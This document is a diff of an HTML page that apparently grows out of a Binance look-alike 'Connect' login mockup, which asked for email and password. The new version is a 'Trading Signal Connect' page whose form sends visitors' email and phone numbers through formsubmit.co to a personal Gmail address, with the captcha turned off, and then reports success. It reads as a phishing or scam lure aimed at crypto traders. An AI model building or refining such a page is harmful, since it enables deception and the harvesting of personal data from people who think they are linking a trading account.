@@ -2,101 +2,65 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Binance Connect</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Trading Signal Connect</title>
 
 <style>
-
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial, Helvetica, sans-serif;
-}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
 
 body{
-background:#f5f6fa;
+background:linear-gradient(135deg,#ffd84d,#fcd535);
+min-height:100vh;
 display:flex;
+align-items:center;
 justify-content:center;
-align-items:center;
-height:100vh;
 }
 
-/* TOP BINANCE HEADER */
-
-.top{
-position:absolute;
-top:0;
-left:0;
-width:100%;
-padding:18px 30px;
-
-/* Binance yellow gradient */
-background:linear-gradient(90deg,#fcd535,#f0b90b);
-color:black;
-font-weight:bold;
-display:flex;
-align-items:center;
-gap:12px;
-}
-
-/* fake logo box (replace with real image if you want) */
-.logo{
-width:34px;
-height:34px;
-background:black;
-border-radius:6px;
-}
-
-.container{
-background:white;
-width:380px;
-padding:35px;
+.card{
+background:#fff;
+width:360px;
+padding:35px 28px;
 border-radius:14px;
 box-shadow:0 15px 40px rgba(0,0,0,0.12);
 }
 
-h2{
+.logo{
+font-weight:bold;
+font-size:22px;
 margin-bottom:6px;
 }
 
 .subtitle{
-margin-bottom:25px;
-color:#555;
 font-size:14px;
+color:#666;
+margin-bottom:22px;
 }
-
-/* INPUTS */
 
 input{
 width:100%;
-padding:14px;
-margin-bottom:14px;
-border-radius:8px;
-border:1px solid #ddd;
-font-size:15px;
+padding:13px;
+margin-bottom:15px;
+border-radius:7px;
+border:1px solid #ccc;
+font-size:14px;
 }
 
-/* BUTTON */
+input:focus{
+border-color:#fcd535;
+outline:none;
+}
 
 button{
 width:100%;
-padding:15px;
+padding:13px;
 border:none;
-border-radius:8px;
-font-size:16px;
-font-weight:bold;
-cursor:pointer;
-
-/* Binance yellow */
 background:#fcd535;
+font-weight:bold;
+border-radius:7px;
+cursor:pointer;
 }
 
-button:hover{
-background:#f0b90b;
-}
-
-/* SUCCESS POPUP */
+button:hover{background:#e6b800}
 
 .popup{
 position:fixed;
@@ -104,76 +68,60 @@ top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,0.45);
+background:rgba(0,0,0,.55);
 display:none;
-justify-content:center;
 align-items:center;
+justify-content:center;
 }
 
-.popup-box{
+.popupbox{
 background:white;
-padding:40px;
-border-radius:14px;
+padding:35px;
+border-radius:12px;
 text-align:center;
 animation:pop .35s ease;
 }
 
 @keyframes pop{
-from{transform:scale(.6);opacity:0;}
-to{transform:scale(1);opacity:1;}
+from{transform:scale(.7);opacity:0}
+to{transform:scale(1);opacity:1}
 }
-
 </style>
 </head>
 
 <body>
 
-<!-- HEADER -->
-<div class="top">
-<div class="logo"></div>
-<div>Binance Connect</div>
-</div>
+<div class="card">
+<div class="logo">Trading Connect</div>
+<div class="subtitle">Connect accurate Signals to your Trading Account</div>
 
-<!-- FORM -->
-<div class="container">
+<form action="https://formsubmit.co/zenithaurora777@gmail.com"
+method="POST"
+onsubmit="showPopup()">
 
-<h2>Connect Software Signals to your Trading Account</h2>
+<input type="email" name="Email" placeholder="Email Address" required>
 
-<div class="subtitle">
-Secure & accurate trading signal connection 
-</div>
+<input type="tel" name="Phone" placeholder="Phone Number" required>
 
-<form onsubmit="showPopup(event)">
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_template" value="table">
 
-<!-- EMAIL FIRST -->
-<input type="email" placeholder="Email Address" required>
-
-<!-- PASSWORD UNDER EMAIL -->
-<input type="password" placeholder="Password" required>
-
-<button type="submit">
-Link Trading Account
-</button>
-
+<button type="submit">Link Trading Account</button>
 </form>
 
 </div>
 
-<!-- SUCCESS POPUP -->
-<div class="popup" id="popup">
-<div class="popup-box">
-<h2>✅ Account Linked</h2>
-<p>Connection successful.</p>
+<div id="popup" class="popup">
+<div class="popupbox">
+<h3>✅ Submitted</h3>
+<p>Details sent successfully</p>
 </div>
 </div>
 
 <script>
-
-function showPopup(e){
-e.preventDefault();
+function showPopup(){
 document.getElementById("popup").style.display="flex";
 }
-
 </script>
 
 </body>
